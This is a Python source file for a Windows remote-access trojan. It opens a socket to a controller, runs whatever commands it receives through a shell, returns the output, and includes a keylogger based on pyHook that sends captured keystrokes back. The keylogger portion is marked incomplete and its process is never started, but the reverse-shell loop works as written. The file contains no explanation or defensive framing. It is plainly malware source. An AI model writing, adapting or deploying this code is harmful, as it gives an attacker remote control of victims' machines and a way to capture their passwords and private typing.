import socket
import os
import subprocess
import multiprocessing
import win32api
import win32console
import win32gui
import pythoncom,pyHook
import select
import time
import ctypes

buffer=''

x=1

s=socket.socket()

def reverseconn():

    host=socket.gethostbyname("localhost")

    port=9999

    global s

    s.connect((host,port))

    while True:

        recvcmd=s.recv(1024)

        if recvcmd[:2].decode("utf-8")=="cd":

            os.chdir(recvcmd[3:].decode("utf-8"))

            s.send(str.encode(str(os.getcwd())+'> '))

        elif recvcmd[:9].decode("utf-8")=="keylogger":

            keyinterface(recvcmd[10:].decode("utf-8"))

        elif recvcmd.decode("utf-8")=="quit":

            break

        elif len(recvcmd)>0 and recvcmd[:2].decode("utf-8")!="cd":

            cmd = subprocess.Popen(recvcmd[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            obyte=cmd.stdout.read()+cmd.stderr.read()

            ostr=str(obyte, "utf-8")

            s.send(str.encode(ostr+str(os.getcwd())+'> '))

    s.close()

def keyinterface(t):

    global x

    global buffer

    seconds=int(t)

    kp=multiprocessing.Process(target=keylogger)

    time.sleep(seconds)

    x=2;

    s.send(str.encode(buffer))

    #incomplete

def keypressed(event):

    global buffer

    if event.Ascii==8:

        buffer=buffer+'<BACKSPACE>'

    elif event.Ascii==9:

        buffer=buffer+'<TAB>'

    elif event.Ascii==13:

        buffer=buffer+'<ENTER>'

    else:

        buffer=buffer+chr(event.Ascii)

    #incomplete

def keylogger():

    global x

    hk=pyHook.HookManager()

    hk.KeyDown=keypressed

    hk.HookKeyboard()

    if x>1:

        ctypes.windll.user32.PostQuitMessage(0)

    pythoncom.PumpMessages()

    #incomplete

def main():

    revhandle=multiprocessing.Process(target=reverseconn)

    revhandle.start()

    revhandle.join()

if __name__=='__main__':

    main()

    

    


        
